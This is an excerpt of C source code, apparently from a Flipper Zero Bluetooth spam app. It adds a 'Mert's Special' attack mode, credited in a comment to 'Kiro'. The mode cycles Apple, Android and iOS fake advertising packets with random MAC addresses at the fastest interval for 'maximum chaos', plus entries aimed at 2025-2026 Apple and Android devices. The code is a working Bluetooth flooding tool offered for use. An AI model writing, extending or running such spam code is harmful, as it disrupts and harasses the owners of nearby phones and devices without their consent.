...
//
// Mert's Special Mod - Added by Kiro
// Cycles through Apple/Android/iOS with latest advertising formats
// Uses random MAC and fastest interval for maximum effectiveness
...
static Attack attacks[] = {
    ...
    {
        .title = "Mert's Special",
        .text = "MAXIMUM CHAOS - All protocols!",
        .payload =
            {
                .random_mac = true,
                .protocol = NULL,
    ...
    {
        .title = "Apple 2026",
        .text = "2025-2026 Apple devices ONLY",
        .payload =
            {
                .random_mac = true,
    ...
    {
        .title = "Android 2026",
        .text = "2025-2026 Android devices",
        .payload =
            {
                .random_mac = true,
...
// MERT_SPECIAL_INDEX is the index of "Mert's Special" attack (index 1, after Kitchen Sink)
#define MERT_SPECIAL_INDEX 1
...
typedef struct {
    ...
    FuriThread* thread;
    int8_t index;
    uint8_t protocol_index; // For Mert's Special: cycles through all protocols
} State;
...
static int32_t adv_thread(void* ctx) {
    ...
    if(state->index == MERT_SPECIAL_INDEX) {
        state->protocol_index = 0;
    }
    
    // Mert's Special: Always use random MAC for maximum chaos
    bool use_random_mac = payload->random_mac || (state->index == MERT_SPECIAL_INDEX);
    
    if(!use_random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));

    while(state->advertising) {
        const BleSpamProtocol* current_protocol = NULL;
        
        // Mert's Special: ULTRA AGGRESSIVE MODE - Sequential + Random hybrid
        if(state->index == MERT_SPECIAL_INDEX) {
            // 80% sequential cycling through all protocols, 20% random for chaos
            if(rand() % 100 < 80) {
                current_protocol = ble_spam_protocols[state->protocol_index];
                state->protocol_index = (state->protocol_index + 1) % ble_spam_protocols_count;
            } else {
                // Random protocol for maximum variety
                current_protocol = ble_spam_protocols[rand() % ble_spam_protocols_count];
            }
            current_protocol->make_packet(&size, &packet, NULL);
            
            // ALWAYS use random MAC for Mert's Special
        ...
        // Mert's Special: Force 20ms delay (FASTEST) for maximum spam
        if(state->index == MERT_SPECIAL_INDEX) {
